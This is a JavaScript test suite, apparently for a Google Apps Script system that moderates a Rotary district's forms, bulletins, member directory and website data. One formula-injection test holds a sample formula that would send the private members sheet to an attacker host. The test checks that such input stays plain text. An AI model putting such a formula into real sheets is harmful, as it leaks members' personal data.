  assert.equal(jhansi().permanent_projects, projectsBefore, 'blank answer keeps the list');
  assert.match(jhansi().regular_services, /^Blood bank desk/, 'replaced');
  const pub = data().clubs.find((c) => c.name === 'RC Jhansi');
  assert.deepEqual(pub.services.map((s) => s.what), ['Blood bank desk'], 'the line with a phone number is kept off the website');
  send({ [Q.pServices]: 'None' });
  env.run('approveSelected');
  assert.equal(jhansi().regular_services, '', '"none" clears the list');
  assert.match(send({ [Q.pProjects]: 'y'.repeat(170) }).moderator_note, /longer than 160 characters/);
});

test('data link: campaigns, event registration, the bulletin start date and skipped items reach the website', () => {
  const d = data();
  assert.deepEqual(d.campaigns.map((c) => c.campaign_id).sort(), ['BLOOD-2026-27', 'SCHOOL-2025-26']);
  assert.match(d.campaigns.find((c) => c.campaign_id === 'BLOOD-2026-27').chair_ref, /^P[0-9a-f]{12}$/);
  assert.ok(d.events.some((e) => e.registration_status === 'Cancelled'));
  assert.match(d.site.bulletin_start_date, /^\d{4}-\d{2}-\d{2}$/);
  assert.ok(Array.isArray(d.skipped_items));
  assert.ok(!JSON.stringify(d).includes('chair_member_id'), 'the chair\'s member ID is not published');
});

test('Saturday preview: the coming Sunday\'s bulletin with the row ids, to the moderators (the district account until they are named)', () => {
  const before = env.mails.length;
  env.run('bulletinPreview');
  const sent = env.mails.slice(before).filter((m) => /no action needed/.test(m.subject));
  const mail = sent[0];
  assert.ok(mail, 'preview sent');
  const s = settingsMap();
  // one email per moderator (each gets their own "Leave this out" links once on the moderators tab)
  assert.equal(sent.map((m) => m.to).join(','), String(s.moderator_emails || '').split(/\s*,\s*/).filter(Boolean).join(',') || 'district.account@example.com');
  assert.match(mail.body, /Full bulletin: \S+\/bulletin\/\d{4}-\d{2}-\d{2}\//);
  assert.match(mail.body, /set bulletin_exclude to TRUE/);
});

test('Sunday message: waits for this week\'s bulletin page and asks for a rebuild; then sends once, the same text the website shows', () => {
  const sunday = core.Core_sundayOf(new Date(Date.now() + 5.5 * 3600 * 1000).toISOString().slice(0, 10));
  env.pages.status = 404;
  const before = env.mails.length;
  assert.equal(env.run('bulletinMessage'), 'waiting for the website');
  assert.equal(env.mails.length, before, 'nothing sent while the page is missing');
  assert.ok(env.triggers.some((t) => t.getHandlerFunction() === 'bulletinMessageRetry'), 'tries again in an hour');
  assert.ok(env.fetched.some((u) => u.endsWith(`/bulletin/${sunday}/`)));
  env.pages.status = 200;
  env.run('bulletinMessageRetry');
  assert.ok(!env.triggers.some((t) => t.getHandlerFunction() === 'bulletinMessageRetry'), 'the one-off retry is removed');
  const mail = env.mails.at(-1);
  assert.match(mail.subject, /please forward/);
  assert.equal(mail.body, core.Core_bulletinMessage(core.Core_bulletin(data(), sunday), settingsMap().site_url), 'same selection as the website');
  assert.ok(mail.body.length <= 1000);
  assert.equal(env.run('bulletinMessage'), 'already sent');
});

/* ---------- Release A (17 October 2026) ---------- */

test('Upgrade Sheet on a Sheet set up before Release A: new questions in place, once; the public service and contact forms; the monthly email; club form links', () => {
  const ids = JSON.parse(env.props.get('FORM_IDS'));
  const later = [Q.aAvenue, Q.aVideo, Q.aPressPaper, Q.aPressDate, Q.aPressLink, Q.eOpen];
  env.forms[ids.activity].items = env.forms[ids.activity].items.filter((i) => !later.includes(i.title));
  // the Club updates and contact forms, their settings and the monthly job did not exist yet
  const gone = [ids.club_updates, ids.contact];
  delete ids.club_updates;
  delete ids.contact;
  env.props.set('FORM_IDS', JSON.stringify(ids));
  for (let i = env.triggers.length - 1; i >= 0; i--) {
    const t = env.triggers[i];
    if (t.getHandlerFunction() === 'notPostingReport' || gone.includes(t.getTriggerSourceId())) env.triggers.splice(i, 1);
  }
  env.run('upgradeSheet');
  env.run('upgradeSheet');
  const after = JSON.parse(env.props.get('FORM_IDS'));
  assert.ok(after.club_updates && after.contact, 'the two new forms were made');
  const act = env.forms[after.activity].titles();
  const prof = env.forms[after.club_updates].titles();
  for (const t of later) assert.equal(act.filter((x) => x === t).length, 1, `${t} added once`);
  assert.equal(act[act.indexOf(Q.aTheme) + 1], Q.aAvenue);
  assert.equal(act[act.indexOf(Q.aLink) + 1], Q.aVideo);
  assert.deepEqual(act.slice(act.indexOf(Q.aVideo), act.indexOf(Q.aVideo) + 4), [Q.aVideo, Q.aPressPaper, Q.aPressDate, Q.aPressLink]);
  assert.equal(act[act.indexOf(Q.eType) + 1], Q.eOpen);
  assert.equal(prof[prof.indexOf(Q.pMeeting + ' (optional)') + 1], Q.pMeetingDay);
  const avenue = env.forms[after.activity].items.find((i) => i.title === Q.aAvenue);
  assert.equal(avenue.required, true, 'the avenue is asked of every activity');
  assert.deepEqual([...avenue.choices], ['Club Service', 'Vocational Service', 'Community Service', 'International Service', 'Youth Service']);
  assert.match(env.forms[after.activity].description, /how-to-post\//, 'the form links to the posting guide');
  assert.equal(env.triggers.filter((t) => t.getHandlerFunction() === 'onAnyFormSubmit').length, 5);
  assert.equal(env.triggers.filter((t) => t.getHandlerFunction() === 'notPostingReport').length, 1);
  const s = settingsMap();
  for (const k of ['form_public_service_url', 'form_contact_url']) assert.match(s[k], /^https:\/\/docs\.google\.com\/forms/, k);
  assert.equal(s.not_posting_emails, 'not-posting@example.com', 'a dummy receiver until the district names one');
  assert.equal(String(s.contact_daily_limit), '20');
  assert.ok('contact_email' in s);
  assert.ok(env.priv.getSheetByName('raw_club_updates_form'), 'club updates go to the private Sheet');
  assert.ok(env.priv.getSheetByName('raw_contact_form'), "visitors' reply details go to the private Sheet");
  const contact = env.forms[after.contact];
  assert.deepEqual(contact.titles(), [Q.kName, Q.kReply, Q.kTopic, Q.kCity, Q.kMessage]);
  const links = env.main.rows('clubs').filter((c) => c.status === 'active').map((c) => c.activity_form_link);
  assert.ok(links.length > 60 && links.every((l) => /^https:\/\/docs\.google\.com\/forms\/d\/e\/.+entry\.\d+=/.test(l)), 'every active club has its own form link');
  const agra = env.main.rows('clubs').find((c) => c.club_name === 'RC Agra');
  assert.ok(agra.activity_form_link.endsWith('=' + encodeURIComponent('RC Agra')), 'with the club already chosen');
  // (the website's own form links may open a form at a section, Release 2; the clubs' own activity links are never published)
  assert.ok(!JSON.stringify(data()).includes('activity_form_link') && !JSON.stringify(data()).includes(agra.activity_form_link), 'the links are never published');
});

test('an activity with its avenue, a video and press coverage; notes when the press link has no paper', () => {
  const base = { [Q.club]: 'RC Mathura', [Q.name]: 'Rtn V', [Q.role]: 'Secretary', [Q.mobile]: '9844444444', [Q.kind]: Q.kindActivity,
    [Q.aDate]: '2026-10-08', [Q.aTheme]: 'Supporting education', [Q.aDesc]: 'Members gave library books and shelves to a government school and trained two teachers to run it.',
    [Q.aLink]: 'https://example.com/library', [Q.aConsent]: ['yes'] };
  env.submit('activity', { ...base, [Q.aTitle]: 'Library for a village school', [Q.aAvenue]: 'Youth Service', [Q.aVideo]: 'youtu.be/dQw4w9WgXcQ',
    [Q.aPressPaper]: 'Amar Ujala, Mathura', [Q.aPressDate]: '2026-10-09', [Q.aPressLink]: 'https://example.com/news/1' });
  let rows = env.main.rows('activities');
  const row = rows.at(-1);
  assert.deepEqual([row.avenue, row.video_link, row.press_paper, row.press_date, row.press_link],
    ['Youth Service', 'https://youtu.be/dQw4w9WgXcQ', 'Amar Ujala, Mathura', '2026-10-09', 'https://example.com/news/1']);
  env.setActive('activities', rows.length + 1);
  env.run('approveSelected');
  const pub = data().activities.find((a) => a.id === row.id);
  assert.equal(pub.avenue, 'Youth Service');
  assert.deepEqual(pub.video, { kind: 'youtube', id: 'dQw4w9WgXcQ', url: 'https://youtu.be/dQw4w9WgXcQ' });
  assert.deepEqual(pub.press, { paper: 'Amar Ujala, Mathura', date: '2026-10-09', link: 'https://example.com/news/1' });
  env.submit('activity', { ...base, [Q.aTitle]: 'Second library', [Q.aDate]: '2026-10-10', [Q.aAvenue]: 'Youth Service', [Q.aPressLink]: 'https://example.com/news/2' });
  assert.match(env.main.rows('activities').at(-1).moderator_note, /Press link without the newspaper's name/);
});

test('events: "Open to everyone?" is filed and reaches the website', () => {
  const ev = { [Q.club]: 'RC Jhansi', [Q.name]: 'Rtn E', [Q.role]: 'President', [Q.mobile]: '9877777777', [Q.kind]: Q.kindEvent,
    [Q.eType]: 'District event', [Q.eStart]: '2026-12-01', [Q.eVenue]: 'Town Hall', [Q.eCity]: 'Jhansi', [Q.eOrganiser]: 'RC Jhansi' };
  env.submit('activity', { ...ev, [Q.eTitle]: 'Health walk for all', [Q.eOpen]: 'Yes' });
  env.submit('activity', { ...ev, [Q.eTitle]: 'Officers meeting', [Q.eOpen]: 'No' });
  const rows = env.main.rows('events');
  assert.equal(rows.at(-2).open_to_all, true);
  assert.equal(rows.at(-1).open_to_all, false);
  env.setActive('events', rows.length, 2);
  env.run('approveSelected');
  const d = data();
  assert.equal(d.events.find((e) => e.title === 'Health walk for all').open_to_all, true);
  assert.equal(d.events.find((e) => e.title === 'Officers meeting').open_to_all, false);
});

test('club profile: the meeting weekday applies to the club when approved, and the clubs page can filter by it', () => {
  env.submit('club_profile', { [Q.club]: 'RC Agra Greater', [Q.name]: 'Rtn P', [Q.role]: 'President', [Q.mobile]: '9866666666', [Q.pMeetingDay]: 'Friday' });
  const rows = env.main.rows('club_profile_requests');
  assert.equal(rows.at(-1).meeting_day, 'Friday');
  env.setActive('club_profile_requests', rows.length + 1);
  env.run('approveSelected');
  assert.equal(env.main.rows('clubs').find((c) => c.club_name === 'RC Agra Greater').meeting_day, 'Friday');
  assert.equal(data().clubs.find((c) => c.name === 'RC Agra Greater').meeting_day, 'Friday');
});

test("public services: filed as pending with notes; a mobile number is flagged; a bad number cannot be approved; approved ones are public with a tap-to-call number", () => {
  const svc = (answers) => {
    env.submit('public_service', { [Q.club]: 'RC Aligarh', [Q.name]: 'Rtn S', [Q.role]: 'Secretary', [Q.mobile]: '9833333333', [Q.sType]: 'Eye care',
      [Q.sTimings]: 'Every day, 9 am–5 pm', [Q.sAddress]: 'Marris Road', [Q.sCity]: 'Aligarh', [Q.sMap]: 'maps.google.com/?q=Aligarh', [Q.sConfirm]: ['yes'], ...answers });
    return env.main.rows('public_services').at(-1);
  };
  const good = svc({ [Q.sName]: 'Rotary Eye Centre', [Q.sPhone]: '0571 270 0000' });
  assert.match(good.id, /^SRV-\d{4}$/);
  assert.deepEqual([good.status, good.club_id, good.city, good.map_link, good.moderator_note], ['pending', 'S-006', 'Aligarh', 'https://maps.google.com/?q=Aligarh', '']);
  assert.ok(!data().public_services.some((x) => x.id === good.id), 'not public while pending');
  const mobile = svc({ [Q.sName]: 'Rotary Night Clinic', [Q.sPhone]: '98765 43210' });
  assert.match(mobile.moderator_note, /is a mobile: check it is the facility's own number/);
  const bad = svc({ [Q.sName]: 'Rotary Library', [Q.sPhone]: 'call the club' });
  assert.match(bad.moderator_note, /not a plain number/);
  const rows = env.main.rows('public_services');
  env.setActive('public_services', rows.length - 1, 3);
  env.run('approveSelected');
  assert.match(env.alerts.at(-1), /Not approved: SRV-\d{4} \(the phone number is not a plain number/);
  const after = env.main.rows('public_services');
  assert.equal(after.find((x) => x.id === bad.id).status, 'pending');
  assert.ok(env.mails.some((m) => /^Approved: public service "Rotary Eye Centre"/.test(m.subject) && /\/services\//.test(m.body)));
  const pub = data().public_services.find((x) => x.id === good.id);
  assert.deepEqual([pub.phone, pub.tel, pub.type], ['0571 270 0000', '+915712700000', 'Eye care']);
  assert.ok(!JSON.stringify(data()).includes('9833333333'), "the sender's mobile is never public");
});

test('48-hour reminders include public services waiting for a moderator', () => {
  const sh = env.main.getSheetByName('public_services');
  const headers = sh.data[0];
  const row = env.main.rows('public_services').findIndex((x) => x.status === 'pending' && /Library/.test(x.name)) + 2;
  sh.getRange(row, headers.indexOf('submitted_at') + 1).setValue('2026-01-01T00:00:00Z');
  const before = env.mails.length;
  env.run('sendReminders_');
  const mail = env.mails.slice(before).find((m) => /waiting more than 48 hours/.test(m.subject));
  assert.match(mail.body, /public_services: SRV-\d{4} – Rotary Library/);
});

test('contact form: kept in the private Sheet and emailed on; spam and messages beyond the daily limit are kept but not emailed; never public', () => {
  const send = (message, name = 'Asha Verma') => {
    env.submit('contact', { [Q.kName]: name, [Q.kReply]: 'asha.v@example.com', [Q.kTopic]: 'I want to volunteer', [Q.kCity]: 'Agra', [Q.kMessage]: message });
    return env.priv.rows('contact_messages').at(-1);
  };
  const before = env.mails.length;
  const first = send('I would like to help at the next blood donation camp in Agra. How can I join?');
  const moderators = String(settingsMap().moderator_emails || '').split(/\s*,\s*/).filter(Boolean).join(',') || 'district.account@example.com';
  assert.deepEqual([first.status, first.forwarded_to, first.reply_to, first.topic], ['new', moderators, 'asha.v@example.com', 'I want to volunteer'], 'contact_email blank: the moderators');
  const mail = env.mails.at(-1);
  assert.equal(env.mails.length, before + 1);
  assert.match(mail.subject, /^Website message: I want to volunteer – from Asha Verma/);
  assert.match(mail.body, /Reply to: asha\.v@example\.com/);
  const spam = send('cheap http://a.example http://b.example http://c.example deals', 'Bot');
  assert.equal(spam.status, 'spam');
  assert.equal(spam.forwarded_to, '');
  assert.equal(env.mails.length, before + 1, 'spam is not emailed');
  // today's forwarded messages count towards the limit
  env.context.setSetting_('contact_daily_limit', '1');
  const sh = env.priv.getSheetByName('contact_messages');
  const col = sh.data[0].indexOf('submitted_at') + 1;
  for (let r = 2; r <= sh.getLastRow(); r++) sh.getRange(r, col).setValue(new Date().toISOString());
  const third = send('Our company would like to support a school project in Kanpur next month.');
  assert.match(third.note, /Not emailed: more than 1 messages today/);
  assert.equal(env.mails.length, before + 1);
  env.context.setSetting_('contact_daily_limit', '20');
  const d = JSON.stringify(data());
  assert.ok(!d.includes('asha.v@example.com') && !d.includes('Asha Verma'), 'contact messages never reach the website');
});

test('form answers that start with = + - or @ are kept as text, never turned into formulas (contact form into the private Sheet, activities into the main one)', () => {
  const grab = '=IMAGE("https://attacker.example/?d="&TEXTJOIN(",",TRUE,members_master!A:Z))';
  env.submit('contact', { [Q.kName]: '=1+1', [Q.kReply]: '+91 98765 11111', [Q.kTopic]: 'I want to volunteer', [Q.kCity]: '@Agra', [Q.kMessage]: grab });
  const msg = env.priv.rows('contact_messages').at(-1);
  assert.deepEqual([msg.name, msg.reply_to, msg.city, msg.message], ['=1+1', '+91 98765 11111', '@Agra', grab]);
  assert.equal(env.priv.getSheetByName('contact_messages').formulas.size, 0, 'no formula in the private Sheet');
  env.submit('activity', {
    [Q.club]: 'RC Agra North', [Q.name]: '-Rtn Test', [Q.role]: 'Secretary', [Q.mobile]: '98765 43210', [Q.kind]: Q.kindActivity,
    [Q.aTitle]: '=HYPERLINK("https://attacker.example","Open")', [Q.aDate]: '2026-10-11', [Q.aTheme]: 'Club service / Other',
    [Q.aDesc]: '=A1', 'Photos (up to 3, each under 1 MB)': ['1AbCdEfGhIjKlMnOpQrStUvWxYz0123456'], [Q.aConsent]: ['yes'],
  });
  const act = env.main.rows('activities').at(-1);
  assert.deepEqual([act.title, act.description, act.submitter_name], ['=HYPERLINK("https://attacker.example","Open")', '=A1', '-Rtn Test']);
  assert.equal(env.main.getSheetByName('activities').formulas.size, 0, 'no formula in the main Sheet');
});

test('the private Sheet and the magazine folder are named in the script properties, not the public code; without them the data link says what to add', () => {
  const code = bundleCode();
  assert.doesNotMatch(code, /PRIVATE_SHEET_ID:|MAGAZINE_FOLDER_ID:/);
  const saved = env.props.get('PRIVATE_SHEET_ID');
  env.props.delete('PRIVATE_SHEET_ID');
  const r = env.doGet({ mode: 'data', token });
  env.props.set('PRIVATE_SHEET_ID', saved);
  assert.equal(r.ok, false);
  assert.match(r.error, /add the script property PRIVATE_SHEET_ID \(Apps Script → Project Settings → Script properties\)/);
  assert.ok(data().clubs.length, 'works again once it is set');
});

test('monthly email: the quiet clubs (no activity in the last 30 days), the same as the dashboard, to the dummy receiver; private', () => {
  const before = env.mails.length;
  const n = env.run('notPostingReport');
  const mail = env.mails.at(-1);
  assert.equal(env.mails.length, before + 1);
  assert.equal(mail.to, 'not-posting@example.com');
  assert.equal(mail.subject, 'Clubs with no activity in the last 30 days');
  assert.ok(n > 10);
  env.run('refreshDashboard');
  assert.equal(env.main.rows('dashboard').filter((r) => String(r.needs_nudge).toUpperCase() === 'TRUE').length, n, 'the dashboard flags the same clubs');
  assert.equal((mail.body.match(/^• /gm) || []).length, n);
  assert.match(mail.body, /not shown on the website/);
});

test('data link: public services, profiles and Past District Governors reach the website; zones and member IDs do not', () => {
  const d = data();
  assert.ok(d.public_services.length >= 7);
  assert.deepEqual(d.profiles.map((p) => p.role), ['President of Rotary International', 'District Governor']);
  assert.equal(d.past_governors.length, 28);
  const text = JSON.stringify(d);
  assert.ok(!/"zones?"/.test(text), 'no zones');
  assert.ok(!/T-00\d\d/.test(text), 'no member IDs of past governors');
  assert.deepEqual(plain(core.Core_validatePublic(d)), []);
});

test('magazine folder: a new YYYY-MM.pdf is added once, with its cover picture or the PDF thumbnail; other files are ignored', () => {
  const folderId = env.props.get('MAGAZINE_FOLDER_ID');
  const known = env.main.rows('magazines').map((m) => String(m.issue_month).slice(0, 7));
  assert.ok(known.length > 0, 'the sample has magazines');
  env.files.set('MAGPDF11', { name: '2026-11.pdf', folder: folderId });
  env.files.set('MAGJPG11', { name: '2026-11.jpg', folder: folderId });
  env.files.set('MAGPDF12', { name: '2026-12 District News.pdf', folder: folderId });
  env.files.set('MAGOLD', { name: known[0] + '.pdf', folder: folderId }); // a month already listed
  env.files.set('MAGNOTE', { name: 'notes.pdf', folder: folderId });
  env.files.set('ELSEWHERE', { name: '2027-01.pdf', folder: 'SOMEWHERE_ELSE' });
  env.run('scanMagazines_');
  env.run('scanMagazines_');
  const rows = env.main.rows('magazines');
  assert.equal(rows.length, known.length + 2, 'November and December added, once each');
  const nov = rows.find((m) => String(m.issue_month).startsWith('2026-11'));
  assert.equal(nov.title, 'District 3110 News – November 2026');
  assert.equal(nov.pdf_file, 'drive:MAGPDF11');
  assert.equal(nov.cover_image, 'drive:MAGJPG11');
  assert.equal(rows.find((m) => String(m.issue_month).startsWith('2026-12')).cover_image, 'thumb:MAGPDF12', 'no cover picture: the PDF thumbnail');
  const d = data();
  assert.ok(d.magazines.some((m) => m.issue_month === '2026-11' && m.file === 'drive:MAGPDF11' && m.cover === 'drive:MAGJPG11'), 'reaches the website');
  assert.deepEqual(plain(core.Core_validatePublic(d)), []);
});

test('MemberPhotos folder: <member ID>.jpg is used only for a member who ticked photo consent', () => {
  // two listed members in the directory, without a photo yet: one ticked photo consent, one did not
  const ps = env.run('privateSs_');
  const listed = env.run('readTab_', ps, 'members_master').filter((m) => String(m.status || 'active').toLowerCase() === 'active' &&
    core.Core_isTrue(m.listing_approved) && core.Core_isTrue(m.is_rotarian) && core.Core_isTrue(m.directory_ok) && m.member_id);
  const [yes, no] = listed;
  assert.ok(yes && no, 'the sample has listed members');
  env.run('updateRow_', ps, 'members_master', yes._row, { photo_ok: true, photo_file: '', photo_approved: false });
  env.run('updateRow_', ps, 'members_master', no._row, { photo_ok: false, photo_file: '', photo_approved: false });
  env.files.set('1FolderPhotoOne0123456789abcdefgh', { name: `${yes.member_id}.jpg`, folder: 'PHOTOS' });
  env.files.set('1FolderPhotoTwo0123456789abcdefgh', { name: `${no.member_id}.jpg`, folder: 'PHOTOS' });
  env.run('refreshPublicMembers', true);
  const after = env.priv.rows('members_master');
  const y = after.find((m) => m.member_id === yes.member_id);
  const n = after.find((m) => m.member_id === no.member_id);
  assert.equal(y.photo_file, 'drive:1FolderPhotoOne0123456789abcdefgh');
  assert.ok(core.Core_isTrue(y.photo_approved), 'placed by a moderator, so approved');
  assert.equal(n.photo_file || '', '', 'no photo consent: the file is not used');
  const d = data();
  assert.equal(d.members.find((m) => m.public_key === y.public_key)?.photo, 'drive:1FolderPhotoOne0123456789abcdefgh', 'shown on the website');
  assert.ok(!JSON.stringify(d).includes('1FolderPhotoTwo0123456789abcdefgh'));
  assert.deepEqual(plain(core.Core_validatePublic(d)), []);
});

test('"Clear all sample data" leaves only real rows, and the site data is still valid', () => {
  env.run('clearSampleData');
  assert.equal(env.main.rows('clubs').length, 0, 'sample clubs removed');
  assert.equal(env.main.rows('functionaries').length, 0, 'Excel rows were marked sample, as agreed');
  assert.equal(env.main.rows('campaigns').length, 0, 'sample campaigns removed too');
  assert.ok(!env.main.rows('public_services').some((x) => x.is_sample === true), 'sample services removed; real ones kept');
  assert.ok(env.main.rows('public_services').some((x) => x.name === 'Rotary Eye Centre'));
  assert.equal(env.main.rows('past_governors').length, 0);
  assert.ok(env.main.rows('activities').some((a) => a.id === newActivityId), 'real (form) rows kept');
  assert.ok(env.priv.rows('members_master').some((m) => m.member_id === '7654321'), 'real member records kept');
  assert.ok(!env.priv.rows('members_master').some((m) => m.is_sample === true));
  const d = data();
  assert.deepEqual(plain(core.Core_validatePublic(d)), []);
  // a real event that was numbered before the sample grew holds an ID the sample also uses
  const events = env.main.getSheetByName('events');
  const realRow = env.main.rows('events').findIndex((e) => e.title === 'Blood donation drive') + 2;
  events.getRange(realRow, 1).setValue('EVT-2026-0011');
  // "Load sample data" puts it back for testing, without a second EVT-2026-0011
  const counts = env.run('loadSampleData', true);
  assert.equal(env.main.rows('clubs').length, 70);
  assert.deepEqual(env.main.rows('events').filter((e) => e.id === 'EVT-2026-0011').map((e) => e.title), ['Blood donation drive']);
  assert.ok(counts.some((c) => /^events: 1 sample row\(s\) not loaded/.test(c)), counts.join('\n'));
});

test('new forms are moved from My Drive into the folder that holds the Sheet, and stay there on later upgrades', () => {
  const ids = JSON.parse(env.props.get('FORM_IDS'));
  assert.equal(Object.keys(ids).length, 5);
  for (const id of Object.values(ids)) assert.equal(env.moved.get(id), 'PARENT', `${id} in the Sheet's folder`);
  const before = env.moved.size;
  env.run('upgradeSheet');
  assert.equal(env.moved.size, before, 'nothing moved twice');
});

test('new columns do not inherit the TRUE/FALSE dropdown of the column before them; Upgrade Sheet repairs a Sheet where they did', () => {
  const sh = env.main.getSheetByName('activities');
  const head = sh.getRange(1, 1, 1, sh.getLastColumn()).getValues()[0];
  const cut = head.indexOf('avenue');
  assert.ok(cut > 0 && head[cut - 1] === 'bulletin_exclude', head.join());
  // a Sheet from before Release A: the tab ends at bulletin_exclude, which has a TRUE/FALSE dropdown
  sh.data = sh.data.map((row) => row.slice(0, cut));
  sh.maxCols = cut;
  for (const c of [...sh.rules.keys()]) if (c > cut) sh.rules.delete(c);
  assert.deepEqual(sh.rules.get(cut).list, ['TRUE', 'FALSE']);
  env.run('upgradeSheet');
  const col = (name) => sh.getRange(1, 1, 1, sh.getLastColumn()).getValues()[0].indexOf(name) + 1;
  for (const c of ['video_link', 'press_paper', 'press_date', 'press_link']) assert.equal(sh.rules.get(col(c)), undefined, `${c} has no dropdown`);
  assert.deepEqual(sh.rules.get(col('avenue')).list, ['Club Service', 'Vocational Service', 'Community Service', 'International Service', 'Youth Service']);
  // a Sheet already upgraded with the copied dropdown (as happened on 18 Oct) is repaired by running Upgrade Sheet again
  sh.rules.set(col('video_link'), sh.rules.get(col('bulletin_exclude')));
  env.run('upgradeSheet');
  assert.equal(sh.rules.get(col('video_link')), undefined);
  assert.deepEqual(sh.rules.get(col('bulletin_exclude')).list, ['TRUE', 'FALSE']);
  // and the sample loads, videos included
  env.run('clearSampleData');
  env.run('loadSampleData', true);
  assert.ok(env.main.rows('activities').some((a) => /youtu/.test(a.video_link)), 'sample video links loaded');
});

/* ---------- moderator types, confirmation emails to members, photo consent wording (18 Oct) ---------- */

test('moderators tab: placeholders by type; emails go by type, falling back to the older settings until names are filled in', () => {
  const rows = env.main.rows('moderators');
  assert.deepEqual(rows.map((r) => r.type), ['Content', 'Content', 'Members', 'Club engagement', 'District office', 'Administrator']);
  assert.ok(rows.every((r) => r.email === '' && /Placeholder/.test(r.notes)));
  assert.deepEqual(rows.map((r) => r.sheet_access), ['FALSE', 'FALSE', 'FALSE', 'FALSE', 'FALSE', 'TRUE'], 'only the Administrator placeholder has the Sheet');
  env.run('upgradeSheet');
  assert.equal(env.main.rows('moderators').length, 6, 'placeholders written once');
  assert.deepEqual(env.main.getSheetByName('moderators').rules.get(1).list, [...env.context.CORE_MODERATOR_TYPES]);
  assert.deepEqual(env.main.getSheetByName('moderators').rules.get(7).list, ['TRUE', 'FALSE']);
  // until emails are filled in, the monthly list still goes to the dummy not_posting_emails
  assert.equal(env.run('moderatorRecipients_', 'Club engagement', 'not_posting_emails'), 'not-posting@example.com');
  const sh = env.main.getSheetByName('moderators');
  const fill = (i, email, active = 'TRUE') => { sh.set(i + 2, 3, email); sh.set(i + 2, 4, active); };
  fill(0, 'Content.One@example.com');
  fill(1, 'content.two@example.com');
  fill(2, 'members.one@example.com');
  fill(3, 'clubs.one@example.com');
  fill(4, 'office@example.com');
  assert.equal(env.run('moderatorRecipients_', 'Content'), 'content.one@example.com,content.two@example.com');
  assert.equal(env.run('moderatorRecipients_', 'Club engagement', 'not_posting_emails'), 'clubs.one@example.com');
  assert.equal(env.run('moderatorRecipients_', 'District office', 'contact_email'), 'office@example.com');
  fill(1, 'content.two@example.com', 'FALSE');
  assert.equal(env.run('moderatorRecipients_', 'Content'), 'content.one@example.com', 'an inactive row gets nothing');
  // the monthly list, the Sunday message and the Saturday preview follow the types
  const before = env.mails.length;
  env.run('notPostingReport');
  assert.equal(env.mails.at(-1).to, 'clubs.one@example.com');
  env.run('bulletinMessage', true);
  assert.equal(env.mails.at(-1).to, 'office@example.com');
  env.run('bulletinPreview');
  assert.equal(env.mails.at(-1).to, 'content.one@example.com');
  assert.equal(env.mails.length - before, 3);
  // the moderators tab is never sent to the website
  assert.ok(!JSON.stringify(data()).includes('members.one@example.com'));
});

test('48-hour reminders: content items to Content moderators, member requests to Members moderators', () => {
  env.submit('removal', { [Q.rClub]: 'RC Kanpur', [Q.rName]: 'Rtn Late Request', [Q.rMobile]: '9876509999', [Q.rItems]: ['Birthday'] });
  const sh = env.priv.getSheetByName('removal_requests');
  const h = sh.data[0];
  sh.set(sh.getLastRow(), h.indexOf('submitted_at') + 1, '2026-01-01T00:00:00Z');
  const before = env.mails.length;
  env.run('dailyJobs');
  const sent = env.mails.slice(before).filter((m) => /waiting more than 48 hours/.test(m.subject));
  const members = sent.find((m) => m.body.includes('Rtn Late Request'));
  assert.equal(members.to, 'members.one@example.com');
  assert.match(members.body, /Member requests/);
  assert.ok(sent.filter((m) => m !== members).every((m) => m.to === 'content.one@example.com' && !m.body.includes('removal_requests')));
  env.run('rejectRequest', 'removal', env.priv.rows('removal_requests').at(-1).id, 'test');
});

test('Apply moderators: owner only; only rows with sheet_access TRUE edit the main Sheet, Members and Administrator the private one too; others lose access', () => {
  env.setUser('moderator.a@example.com');
  env.run('applyModerators');
  assert.match(env.alerts.at(-1), /Only the owner/);
  env.setUser('district.account@example.com');
  const mods = env.main.getSheetByName('moderators');
  [2, 3, 4, 5, 6].forEach((row) => mods.set(row, 7, 'TRUE'));
  env.main.editors.push('nosheet@example.com');
  env.main.getSheetByName('moderators').appendRow(['Content', 'Desk Only', 'nosheet@example.com', 'TRUE', '', '', 'FALSE']);
  env.main.editors.push('helper@example.com', 'content.two@example.com'); // an editor not in the tab, and one now inactive
  const plan = env.run('applyModerators');
  assert.deepEqual([...plan.addMain].sort(), ['clubs.one@example.com', 'content.one@example.com', 'members.one@example.com', 'office@example.com']);
  assert.deepEqual([...plan.removeMain].sort(), ['content.two@example.com', 'nosheet@example.com'], 'inactive, or active without sheet_access (the desk needs none)');
  assert.deepEqual([...plan.addPrivate], ['members.one@example.com']);
  assert.ok(env.main.editors.includes('helper@example.com'), 'people not in the tab are left alone');
  assert.ok(env.main.editors.includes('district.account@example.com') && !env.main.editors.includes('content.two@example.com'));
  assert.deepEqual([...env.priv.editors].sort(), ['district.account@example.com', 'members.one@example.com']);
  // moving someone off the Members type removes the private Sheet only
  env.main.getSheetByName('moderators').set(4, 1, 'Content');
  const again = env.run('applyModerators');
  assert.deepEqual([...again.removePrivate], ['members.one@example.com']);
  assert.deepEqual([...again.removeMain], []);
  env.run('applyModerators');
  assert.match(env.alerts.at(-1), /already matches/);
  env.main.getSheetByName('moderators').set(4, 1, 'Members');
  // sheet_access FALSE for a Members moderator: off both Sheets, still on the desk and still emailed
  env.run('applyModerators');
  mods.set(4, 7, 'FALSE');
  const off = env.run('applyModerators');
  assert.deepEqual([[...off.removeMain], [...off.removePrivate]], [['members.one@example.com'], ['members.one@example.com']]);
  assert.match(env.run('moderatorRecipients_', 'Members'), /members\.one@example\.com/);
  mods.set(4, 7, 'TRUE');
  env.setUser('moderator.a@example.com');
});

test('confirmation emails: the sender hears when a form is approved, applied, or turned down', () => {
  const me = addPerson('5570001', 'Rtn Confirm Me', clubId('RC Agra'), { email: 'confirm.me@example.com' });
  env.submit('show_details', show(['directory', 'birthday'], forMember(me)), 'club.secretary@example.com', new Date());
  env.run('approveConsent', pendingId('consent_requests'), true);
  const done = env.mails.filter((x) => /^Your choices: Rtn Confirm Me/.test(x.subject));
  assert.deepEqual(done.map((x) => x.to).sort(), ['club.secretary@example.com', 'confirm.me@example.com']);
  assert.match(done[0].body, /Birthday \(day and month only\): List/);
  assert.match(done[0].body, /docs\.google\.com\/forms/, 'with the form to change it');

  env.submit('show_details', show(['directory']), 'confirm.me@example.com', new Date());
  assert.equal(env.mails.at(-1).to, 'confirm.me@example.com');
  assert.match(env.mails.at(-1).body, /Birthday \(day and month only\): Do not list/);

  env.submit('update_details', update({ ...forMember(me), [Q.cProfession]: 'Doctor' }), 'turned.down@example.com', new Date());
  env.run('rejectRequest', 'consent', pendingId('consent_requests'), 'The photo shows more than one person');
  assert.equal(env.mails.at(-1).to, 'turned.down@example.com');
  assert.match(env.mails.at(-1).body, /Reason: The photo shows more than one person/);
